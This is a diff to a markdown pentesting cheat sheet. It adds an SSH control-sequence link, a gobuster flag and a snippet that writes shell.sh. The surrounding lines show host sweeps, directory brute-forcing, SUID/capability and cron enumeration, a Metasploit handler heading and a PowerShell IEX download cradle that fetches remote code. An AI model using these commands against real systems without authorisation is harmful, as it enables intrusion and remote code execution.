@@ -20,6 +20,8 @@ $ fping –a –g 10.54.12.010.54.12.255 2> /dev/null
 ```
 # cheat sheet
 
+## SSH "Konami Code" (SSH Control Sequences) 
+link [here](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)
 ## wpscan
 https://www.cyberpunk.rs/wpscan-usage-example
 ## SUID
@@ -42,6 +44,7 @@ powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://
 powershell -c "Invoke-WebRequest -Uri 'web' -OutFile 'out'"
 ```
 ## gobuster
+- -k – Skip verification of SSL certificates.
 ```console
 $ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,php,txt -t 54
 ```
@@ -100,7 +103,12 @@ $ getcap -r / 2>/dev/null
 ```console
 $ for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done
 ```
-## msfconsole
+# echo "#!/bin/bash"
+```console
+$ set +H
+$ echo "#!/bin/bash" > shell.sh
+```
+# msfconsole
 ### linux
 ```
 use multi/handler
